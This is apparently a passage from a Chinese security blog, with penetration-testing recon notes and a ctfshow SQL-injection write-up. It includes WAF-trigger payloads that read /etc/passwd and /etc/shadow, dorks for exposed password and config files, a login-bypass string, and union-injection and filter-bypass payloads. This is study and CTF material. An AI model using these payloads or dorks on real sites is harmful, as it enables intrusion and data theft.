href="#WAF触发拦截方式" class="headerlink" title="WAF触发拦截方式"></a>WAF触发拦截方式</h6><pre class="language-javascript" data-language="javascript"><code class="language-javascript">xsstring <span class="token operator">=</span> '<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Xss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">sqlistring &#x3D; &quot;UNION SELECT ALL FROM information schema AND &#39; or SLEEP(5) or &#39;&quot;</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">Ifistring <span class="token operator">=</span> "<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/./<span class="token punctuation">..</span>/etc/passwd</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">rcestring <span class="token operator">=</span> <span class="token string">'/bin/cat /etc/passwd; ping 127.0.0.1; curl google.com'</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript">xxestring <span class="token operator">=</span> '<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">ENTITY</span> xxe <span class="token constant">SYSTEM</span> <span class="token string">"file:///etc/shadow"</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token operator">></span><span class="token operator">&lt;</span>pwn<span class="token operator">></span><span class="token operator">&amp;</span>hack<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>pwn<span class="token operator">></span>"</code></pre><h6 id="WAF识别工具"><a href="#WAF识别工具" class="headerlink" title="WAF识别工具"></a>WAF识别工具</h6><p>Kali自带：</p><ul><li><p><a href="https://github.com/EnableSecurity/wafwOOf">wafwOOf</a> </p></li><li><p>wafw00f <a href="https://www.12306.cn/">https://www.12306.cn</a></p></li><li><p>nmap <a href="http://www.12306.cn/">www.12306.cn</a> –script&#x3D;http-waf-detect.nse</p></li><li><p>sqlmap -u “xxx.com?id&#x3D;1” –identify-waf</p></li></ul><p>其他：</p><ul><li><a href="https://github.com/Oxlnfection/Awesome-WAF">Build software better, together</a></li></ul><h5 id="搜索引擎-Google语法"><a href="#搜索引擎-Google语法" class="headerlink" title="搜索引擎(Google语法)"></a>搜索引擎(Google语法)</h5><p>查找正文含有关键字的网页</p><h6 id="intext"><a href="#intext" class="headerlink" title="intext"></a>intext</h6><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">intext</span><span class="token punctuation">:</span>后台登陆      只返回正文包含“后台登陆”的网页</code></pre><h6 id="intitle"><a href="#intitle" class="headerlink" title="intitle"></a>intitle</h6><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">intitle</span><span class="token punctuation">:</span>后台登陆           只返回标题中包含“后台登录”的网页</code></pre><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">allintitle</span><span class="token punctuation">:</span>后台登陆 管理员       可以指定多个词</code></pre><h6 id="inurl"><a href="#inurl" class="headerlink" title="inurl"></a>inurl</h6><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">inurl</span><span class="token punctuation">:</span>login</code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">inurl</span><span class="token operator">:</span><span class="token operator">/</span>admin<span class="token operator">/</span>login<span class="token punctuation">.</span>php      查找管理员登陆页面<span class="token literal-property property">inurl</span><span class="token operator">:</span><span class="token operator">/</span>phpmyadmin<span class="token operator">/</span>index<span class="token punctuation">.</span>php  查找后台数据库管理员页面<span class="token literal-property property">allinurl</span><span class="token operator">:</span>                  可以指定多个词</code></pre><h6 id="site"><a href="#site" class="headerlink" title="site"></a>site</h6><pre class="language-mipsasm" data-language="mipsasm"><code class="language-mipsasm">site:baidu.com inurl:login         只在baidu.com 中查找url中含有 Login的网页</code></pre><h6 id="filetype"><a href="#filetype" class="headerlink" title="filetype"></a>filetype</h6><p>指定访问的文件类型</p><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">site</span><span class="token punctuation">:</span>xcu.edu.cn filetype<span class="token punctuation">:</span>pdf</code></pre><h6 id="link"><a href="#link" class="headerlink" title="link"></a>link</h6><p>指定连接的网页</p><pre class="language-bash" data-language="bash"><code class="language-bash">link:www.baidu.com </code></pre><h6 id="related"><a href="#related" class="headerlink" title="related"></a>related</h6><p>相似类型的网页</p><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">related</span><span class="token punctuation">:</span>www.xcu.edu.cn</code></pre><h6 id="cache"><a href="#cache" class="headerlink" title="cache:"></a>cache:</h6><p>返回浏览器对网站的缓存</p><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">cache</span><span class="token punctuation">:</span>www.xcu.edu.cn</code></pre><h6 id="info"><a href="#info" class="headerlink" title="info:"></a>info:</h6><p>返回站点的指定信息</p><h6 id="define"><a href="#define" class="headerlink" title="define:"></a>define:</h6><p>返回某个词语的定义</p><h6 id="phonebook"><a href="#phonebook" class="headerlink" title="phonebook:"></a>phonebook:</h6><p>电话簿查询美国街道地址和电话号码信息</p><h6 id="查找网站后台"><a href="#查找网站后台" class="headerlink" title="查找网站后台"></a>查找网站后台</h6><ul><li>site:xx.com intext:管理</li><li>site:xx.com inurl:login</li><li>site:xx.com intitle:后台</li></ul><h6 id="查看服务器使用的程序"><a href="#查看服务器使用的程序" class="headerlink" title="查看服务器使用的程序"></a>查看服务器使用的程序</h6><ul><li>site:xx.com filetype:asp</li><li>site:xx.com filetype:php</li><li>site:xx.com filetype:jsp</li><li>site:xx.com filetype:aspx</li></ul><h6 id="查看上传漏洞"><a href="#查看上传漏洞" class="headerlink" title="查看上传漏洞"></a>查看上传漏洞</h6><ul><li>site:xx.com inurl:file</li><li>site:xx.com inurl:load</li></ul><h6 id="index-of"><a href="#index-of" class="headerlink" title="index of"></a>index of</h6><p>利用 Index of 语法去发现允许目录浏览的web网站，就像在本地的普通目录一样</p><pre class="language-bash" data-language="bash"><code class="language-bash">index of /adminindex of /passwdindex of /passwordindex of /mail<span class="token string">"index of /"</span> +passwd<span class="token string">"index of /"</span> +password.txt<span class="token string">"index of /"</span>.htaccess<span class="token string">"index of /root"</span><span class="token string">"index of/cgi-bin"</span><span class="token string">"index of/logs"</span><span class="token string">"index of /config"</span></code></pre><p>inurl</p><p>而上面这些命令中用的最多的就是 inurl: 了，利用这个命令，可以查到很多意想不到的东西</p><pre class="language-bash" data-language="bash"><code class="language-bash">利用 allinurl:winnt/system32/ 查询：列出的服务器上本来应该受限制的诸如“system32” 等目录，如果你运气足够好，你会发现“system32” 目录里的“cmd.exe” 文件，并能执行他，接下来就是提升权限并攻克了。查询 allinurl:wwwboard/passwd.txt  将列出所有有“WWWBoard Password vulnerability”漏洞的服务器查询  inurl:.bash_history  将列出互联网上可以看见 “inurl:.bash_history” 文件的服务器。这是一个命令历史文件，这个文件包含了管理员执行的命令，有时会包含一些敏感信息比如管理员键入的密码。查询 inurl:config.txt  将看见网上暴露了“inurl:config.txt”文件的服务器，这个文件包含了经过哈希编码的管理员的密码和数据库存取的关键信息。</code></pre><p>还有一些其他一些使用“inurl:”和“allinurl:”查询组合的例子</p><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">inurl</span><span class="token punctuation">:</span>admin filetype<span class="token punctuation">:</span>txt<span class="token target symbol">inurl</span><span class="token punctuation">:</span>admin filetype<span class="token punctuation">:</span>db<span class="token target symbol">inurl</span><span class="token punctuation">:</span>admin filetype<span class="token punctuation">:</span>cfg<span class="token target symbol">inurl</span><span class="token punctuation">:</span>mysql filetype<span class="token punctuation">:</span>cfg<span class="token target symbol">inurl</span><span class="token punctuation">:</span>passwd filetype<span class="token punctuation">:</span>txt<span class="token target symbol">inurl</span><span class="token punctuation">:</span>”wwwroot/*.”<span class="token target symbol">inurl</span><span class="token punctuation">:</span>adpassword.txt<span class="token target symbol">inurl</span><span class="token punctuation">:</span>webeditor.php<span class="token target symbol">inurl</span><span class="token punctuation">:</span>file_upload.php<span class="token target symbol">inurl</span><span class="token punctuation">:</span>gov filetype<span class="token punctuation">:</span>xls “restricted”<span class="token target symbol">index of ftp +.mdb allinurl</span><span class="token punctuation">:</span>/cgi-bin/ +mailto</code></pre><h6 id="语法数据库-工具"><a href="#语法数据库-工具" class="headerlink" title="语法数据库&amp;工具"></a>语法数据库&amp;工具</h6><p><a href="https://www.exploit-db.com/googlehacking-database">Google Hacking Database</a></p><p>[Google Dork List](<a href="https://github.com/BullsEye0/google_dork">https://github.com/BullsEye0/google_dork</a>_<br>list)</p><p><a href="https://github.com/opsdisk/pagodo">pagodo - Passive Google Dork</a></p><h5 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h5><h6 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a><a href="https://www.shodan.io/">shodan</a></h6><p>shodan网络搜索引擎偏向网络设备以及服务器的搜索</p><p>网络类</p><pre class="language-bash" data-language="bash"><code class="language-bash">port          端口  product     所使用的软件或产品os          操作系统类型version：    搜索指定的软件版本，例如 version:<span class="token string">"1.3.2"</span>net：搜索指定的IP地址或子网，例如 net:<span class="token string">"110.43.140.0/24"</span></code></pre><p>应用类</p><pre class="language-bash" data-language="bash"><code class="language-bash">html.title  网页标题http.html   网页内容http.server http请求返回中server的类型http.status http请求返回响应码的状态<span class="token function">hostname</span>  主机类型http.favicon.hash icon对应hashvuln       CVE漏洞编号，例如：vuln：CVE-2014-0723</code></pre><p>地理位置类</p><pre class="language-bash" data-language="bash"><code class="language-bash">country：搜索指定的国家，例如 country:<span class="token string">"CN"</span>city：搜索指定的城市，例如 city:<span class="token string">"Beijing"</span>org：搜索指定的组织或公司，例如 org:<span class="token string">"google"</span>isp：搜索指定的ISP供应商，例如 isp:<span class="token string">"China Telecom"</span></code></pre><p>其他<br>如果需要多个词同时搜索时，只需要在每个关键字间加空格分割就行，比如：country:“CN” city:“Beijing”<br>当不需要某个词时，可以用”-”加上关键词来进行去除。比如：”-port:80”（排除80端口搜索结果）<br><a href="https://github.com/random-robbie/My-Shodan-Scripts">My-Shodan-Scripts</a></p><h6 id="censys"><a href="#censys" class="headerlink" title="censys"></a><a href="https://search.censys.io/">censys</a></h6><ul><li>23.0.0.0&#x2F;8 or 8.8.8.0&#x2F;24　　可以使用and or not</li><li>80.http.get.status_code: 200　　指定状态</li><li>80.http.get.status_code:[200 TO 300]　　200-300之间的状态码</li><li>location.country_code: DE　　国家</li><li>protocols: (“23&#x2F;telnet” or “21&#x2F;ftp”)　　协议</li><li>tags: scada　　标签</li><li>80.http.get.headers.server：nginx　　服务器类型版本</li><li>autonomous_system.description: University　　系统描述</li><li>正则</li></ul><h6 id="钟馗之眼ZoomEye"><a href="#钟馗之眼ZoomEye" class="headerlink" title="钟馗之眼ZoomEye"></a><a href="https://www.zoomeye.org/">钟馗之眼ZoomEye</a></h6><p>钟馗之眼搜索引擎偏向web应用层面的搜索。</p><ul><li>app:nginx　　组件名</li><li>ver:1.0　　版本</li><li>os:windows　　操作系统</li><li>country:”China”　　国家</li><li>city:”hangzhou”　　城市</li><li>port:80　　端口</li><li>hostname:google　　主机名</li><li>site:thief.one　　网站域名</li><li>desc:nmask　　描述</li><li>keywords:nmask’blog　　关键词</li><li>service:ftp　　服务类型</li><li>ip:8.8.8.8　　ip地址</li><li>cidr:8.8.8.8&#x2F;24　　ip地址段</li></ul><h6 id="FoFa"><a href="#FoFa" class="headerlink" title="FoFa"></a><a href="https://fofa.info/">FoFa</a></h6><p>FoFa搜索引擎偏向资产搜索。</p><p>搜索语法</p><ul><li>title&#x3D;”abc” 从标题中搜索abc。例：标题中有北京的网站。</li><li>header&#x3D;”abc” 从http头中搜索abc。例：jboss服务器。</li><li>body&#x3D;”abc” 从html正文中搜索abc。例：正文包含Hacked by。</li><li>domain&#x3D;”qq.com” 搜索根域名带有qq.com的网站。例： 根域名是qq.com的网站。</li><li>host&#x3D;”.gov.cn” 从url中搜索.gov.cn,注意搜索要用host作为名称。</li><li>port&#x3D;”443” 查找对应443端口的资产。例： 查找对应443端口的资产。</li><li>ip&#x3D;”1.1.1.1” 从ip中搜索包含1.1.1.1的网站,注意搜索要用ip作为名称。</li><li>protocol&#x3D;”https” 搜索制定协议类型(在开启端口扫描的情况下有效)。例： 查询https协议资产。</li><li>city&#x3D;”Beijing” 搜索指定城市的资产。例： 搜索指定城市的资产。</li><li>region&#x3D;”Zhejiang” 搜索指定行政区的资产。例： 搜索指定行政区的资产。</li><li>country&#x3D;”CN” 搜索指定国家(编码)的资产。例： 搜索指定国家(编码)的资产。</li><li>cert&#x3D;”google.com” 搜索证书(https或者imaps等)中带有google.com的资产。</li></ul><p>高级搜索：</p><ul><li>title&#x3D;”powered by” &amp;&amp; title!&#x3D;discuz</li><li>title!&#x3D;”powered by” &amp;&amp; body&#x3D;discuz</li><li>( body&#x3D;”content&#x3D;\”WordPress” || (header&#x3D;”X-Pingback” &amp;&amp; header&#x3D;”&#x2F;xmlrpc.php” &amp;&amp; body&#x3D;”&#x2F;wp-includes&#x2F;“) ) &amp;&amp; host&#x3D;”gov.cn”</li></ul><h6 id="Dnsdb搜索引擎"><a href="#Dnsdb搜索引擎" class="headerlink" title="Dnsdb搜索引擎"></a><a href="https://www.dnsdb.io/">Dnsdb搜索引擎</a></h6><p>dnsdb搜索引擎是一款针对dbs解析的查询平台。</p><p>搜索语法</p><p>DnsDB查询语法结构为条件1 条件2 条件3 …., 每个条件以空格间隔, DnsDB 会把满足所有查询条件的结果返回给用户.</p><p>域名查询条件</p><p>域名查询是指查询顶级私有域名所有的DNS记录, 查询语法为domain:.<br>例如查询google.com 的所有DNS记录: domain:google.com.<br>域名查询可以省略domain:.</p><p>主机查询条件</p><p>查询语法:host:<br>例如查询主机地址为mp3.example.com的DNS记录: host:map3.example.com<br>主机查询条件与域名查询查询条件的区别在于, 主机查询匹配的是DNS记录的Host值</p><p>按DNS记录类型查询</p><p>查询语法: type:.<br>例如只查询A记录: type:a<br>使用条件:必须存在domain:或者host:条件,才可以使用type:查询语法</p><p>按IP限制</p><p>查询语法: ip:<br>查询指定IP: ip:8.8.8.8, 该查询与直接输入8.8.8.8进行查询等效<br>查询指定IP范围: ip:8.8.8.8-8.8.255.255<br>CIDR: ip:8.8.0.0&#x2F;24<br>IP最大范围限制65536个</p><p>条件组合查询的例子</p><p>查询google.com的所有A记录: google.com type:a</p><h6 id="Apollo"><a href="#Apollo" class="headerlink" title="Apollo"></a><a href="https://github.com/b0bac/ApolloScanner">Apollo</a></h6><h6 id="EHole"><a href="#EHole" class="headerlink" title="EHole"></a><a href="https://github.com/EdgeSecurityTeam/EHole">EHole</a></h6><h6 id="ShuiZe"><a href="#ShuiZe" class="headerlink" title="ShuiZe"></a><a href="https://github.com/0x727/ShuiZe_0x727">ShuiZe</a></h6><h6 id="Kunyu"><a href="#Kunyu" class="headerlink" title="Kunyu"></a><a href="https://github.com/knownsec/Kunyu">Kunyu</a></h6><h6 id="Saucerframe"><a href="#Saucerframe" class="headerlink" title="Saucerframe"></a><a href="https://github.com/saucer-man/saucerframe">Saucerframe</a></h6>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-sqlii</title>
      <link href="/2024/07/05/web%E5%85%A5%E9%97%A8-sqli/"/>
      <url>/2024/07/05/web%E5%85%A5%E9%97%A8-sqli/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><h4 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h4><h5 id="1-SQL注入概念及产生原因："><a href="#1-SQL注入概念及产生原因：" class="headerlink" title="1.SQL注入概念及产生原因："></a>1.SQL注入概念及产生原因：</h5><p>当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊</p><p>的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p><h5 id="2-SQL注入的本质："><a href="#2-SQL注入的本质：" class="headerlink" title="2.SQL注入的本质："></a>2.SQL注入的本质：</h5><p>把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则</p><h5 id="3-SQL注入的两个关键点："><a href="#3-SQL注入的两个关键点：" class="headerlink" title="3.SQL注入的两个关键点："></a>3.SQL注入的两个关键点：</h5><p>1.用户能控制输入的内容； </p><p>2.web应用把用户输入的内容带入到数据库执行；</p><h5 id="SQL注入基础危害："><a href="#SQL注入基础危害：" class="headerlink" title="SQL注入基础危害："></a>SQL注入基础危害：</h5><p>1.盗取网站的敏感信息;</p><p>2.绕过网站后台认证 后台登录语句： </p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM admin WHERE Username&#x3D;‘user’ and Password&#x3D;‘pass’ 万能密码：‘or ’1‘ &#x3D; ’1‘ # ;</code></pre><p>3.借助SQL注入漏洞提权获取系统权限;</p><p>4.读取文件信息。</p><h4 id="MYSQL数据库注入-常用函数："><a href="#MYSQL数据库注入-常用函数：" class="headerlink" title="MYSQL数据库注入-常用函数："></a>MYSQL数据库注入-常用函数：</h4><p>（1）user() 返回当前使用数据库的用户，也就是网站配置文件中连接数据库的账号 </p><p>（2）version() 返回当前数据库的版本 </p><p>（3）database() 返回当前使用的数据库，只有在use命令选择一个数据库之后，才能查到 </p><p>（4）group_concat() 把数据库中的某列数据或某几列数据合并为一个字符串 </p><p>（5）@@datadir 数据库路径 </p><p>（6）@@version_compile_os 操作系统版本</p><h4 id="SQL（联合）注入流程："><a href="#SQL（联合）注入流程：" class="headerlink" title="SQL（联合）注入流程："></a>SQL（联合）注入流程：</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?id&#x3D;1 and 1&#x3D;1</code></pre><p>1、判断有无闭合 </p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">and 1&#x3D;1 and 1&#x3D;2 &#x2F;&#x2F;结果和第一个一样说明需要闭合，反之无闭合 有闭合则需要用到 --+闭合</code></pre><p>2、猜解字段</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">order by 10 &#x2F;&#x2F;采用二分法 </code></pre><p>3、判断数据回显位置 </p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1 union select 1，2，3，4，5.... &#x2F;&#x2F;参数等号后面加-表示不显示当前数据 </code></pre><p>4、获取当前数据库名、用户、版本 union select version(),database()，user()，4…… 4、获取全部数据库名</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(schema_name)from information_schema.schemata)</code></pre><p>5、获取表名</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;库名&#39;</code></pre><p>6、获取字段名</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;表名&#39;</code></pre><p>7、获取数据</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(字段1，字段2)from 库名.表名</code></pre><p>函数名称： 函数功能：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">查 库： select schema_name from information_schema.schema查 表： select table_name from information_schema.tables where table_schema&#x3D;库名查 列： select column_name from information_schema.columns where table_name&#x3D;表名查数据： select 列名 from 库名.表名</code></pre><blockquote><p><a href="https://blog.csdn.net/fly_enum/article/details/135307756">SQL注入原理及思路绕过</a></p></blockquote><p>万能密码：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; or 1&#x3D;1--+</code></pre><h4 id="mysql操作符优先级：（数字越大，优先级越高）"><a href="#mysql操作符优先级：（数字越大，优先级越高）" class="headerlink" title="mysql操作符优先级：（数字越大，优先级越高）"></a>mysql操作符优先级：（数字越大，优先级越高）</h4><p>优先级运算符<br>1:&#x3D;<br>2|| , OR , XOR<br>3&amp;&amp; , AND<br>4NOT<br>5BETWEEN, CASE, WHEN, THEN, ELSE<br>6&#x3D;, &lt;&#x3D;&gt;, &gt;&#x3D;, &gt;, &lt;&#x3D;, &lt;, &lt;&gt;, !&#x3D;, IS, LIKE, REGEXP, IN<br>7|<br>8&amp;<br>9&lt;&lt;, &gt;&gt;<br>10-, +<br>11*, &#x2F;, DIV, %, MOD<br>12^<br>13- (一元减号), ~ (一元比特反转)<br>14!<br>15BINARY, COLLATE</p><h4 id="总结–普通SQL注入必备条件："><a href="#总结–普通SQL注入必备条件：" class="headerlink" title="总结–普通SQL注入必备条件："></a>总结–普通SQL注入必备条件：</h4><p>1、界面能够回显数据库查询到的数据（必要条件）；</p><p>2、界面回显内容至少能够显示数据库中的某列数据（必要条件）；</p><p>3、部分能够直接提供数据库报错内容的回显；</p><h3 id="web171-253"><a href="#web171-253" class="headerlink" title="web171-253"></a>web171-253</h3><h4 id="web171-单引号闭合"><a href="#web171-单引号闭合" class="headerlink" title="web171(单引号闭合)"></a>web171(单引号闭合)</h4><p>查询语句</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></pre><p>根据流程拿到库 表 列名，最后拿到flag</p><p>第一题所以流程详细一点</p><p>首先尝试1’–+，发现有返回值；说明直接闭合正确；</p><p>接着找用来输出的列：<code>1&#39; order by 3--+</code>，发现一共有3行(就1,2,3,4,5慢慢试出来)</p><p>查看数据库：<code>1&#39; union select 1,2,database()--+</code>得到数据库名为<code>ctfshow_web</code></p><p>爆破表名：<code>-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schecma=database()--+</code>得到表名：<code>ctfshow_user</code></p><p>爆破列名：<code>1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;ctfshow_user&#39;--+</code>，得到列名：<code>id,username,password</code></p><p>爆破信息：<code>1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code>，拿到flag。</p><p>整理一下：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">爆出有哪些位置可以进行输出数据1&#39; order by 3--+查看数据库名字1&#39; union select 1,2,database()--+爆破表名：-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema&#x3D;database()--+爆破列名：1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_user&#39;--+爆破数据：1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code></pre><p>有一个问题就是，这里用的是1而不是-1，居然能够爆出信息。可能是这里没有限定输出数据的量，所以能够用1，而不是用-1。</p><h4 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h4><p>跟上一题差不多，只不过这里把flag换到另一个表<code>ctfshow_user2</code>里了，而且字段数改为2了</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">爆破表名-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema&#x3D;database()--+爆破列名-1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_user2&#39;--+爆破flag-1&#39; union select 1,2,group_concat(password) FROM ctfshow_user2 where username&#x3D;&#39;flag&#39;--+</code></pre><h4 id="web173-回显检测"><a href="#web173-回显检测" class="headerlink" title="web173(回显检测)"></a>web173(回显检测)</h4><p>返回逻辑多了限制，回显不能有flag，但是直接查flag回显是ctfshow</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//检查结果是否有flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'查询成功'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39; union select 1,2,password from ctfshow_user3 where username &#x3D; &#39;flag&#39; --+1&#39; union select 1,2,group_concat(&#39;+&#39;,password) from ctfshow_user3 where username&#x3D;&#39;flag&#39;--+</code></pre><p>或者使用其他绕过姿势  <strong>编码绕过,base64，hex</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; union select 1,2,to_base64(password) from ctfshow_user3 where username&#x3D;&#39;flag&#39;--+-1&#39; union select 1,to_base64(username),hex(password) from ctfshow_user3 --+</code></pre><h4 id="web174-replace"><a href="#web174-replace" class="headerlink" title="web174(replace)"></a>web174(replace)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//检查结果是否有flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag|[0-9]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'查询成功'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>   </code></pre><p>限制了数字和<code>flag</code></p><p>替换：将数据to_base64加密，然后将里面所有的数字用replace()替换</p><p>替换方式：<code>1 @A</code>,<code>2 @B</code> <code>3 @C</code>等等</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39; union select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),&quot;1&quot;,&quot;@A&quot;),&quot;2&quot;,&quot;@B&quot;),&quot;3&quot;,&quot;@C&quot;),&quot;4&quot;,&quot;@D&quot;),&quot;5&quot;,&quot;@E&quot;),&quot;6&quot;,&quot;@F&quot;),&quot;7&quot;,&quot;@G&quot;),&quot;8&quot;,&quot;@H&quot;),&quot;9&quot;,&quot;@I&quot;),&quot;0&quot;,&quot;@J&quot;) from ctfshow_user4 where username &#x3D; &#39;flag&#39; --+</code></pre><p>然后使用脚本解密得到flag</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64 flag64 <span class="token operator">=</span> <span class="token string">" "</span> flag <span class="token operator">=</span> flag64<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@A"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@B"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@C"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@D"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@E"</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@F"</span><span class="token punctuation">,</span> <span class="token string">"6"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@G"</span><span class="token punctuation">,</span> <span class="token string">"7"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@H"</span><span class="token punctuation">,</span> <span class="token string">"8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@I"</span><span class="token punctuation">,</span> <span class="token string">"9"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@J"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="web175-into-outfile"><a href="#web175-into-outfile" class="headerlink" title="web175(into outfile)"></a>web175(into outfile)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//检查结果是否有flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\x00-\x7f]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'查询成功'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>      